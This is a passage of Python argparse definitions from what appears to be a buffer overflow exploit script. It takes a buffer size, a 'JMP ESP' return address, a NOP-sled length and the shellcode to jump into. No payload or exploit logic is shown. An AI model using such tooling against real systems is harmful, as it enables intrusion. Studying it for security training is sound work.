...
parser.add_argument('--buffer', '-b', type=int,help='The size of the buffer', action='store', default=100, required=True)
parser.add_argument('--memaddr', '-m', type=str,help='Memory address for "JMP ESP"', action='store', required=True)
parser.add_argument('--nops', '-n', type=int, help='number of NOPS to use for padding, default is 32', default=32, required=True)
parser.add_argument('--overflow','-o',type=str, help='The exploit code to jump into', required=True)
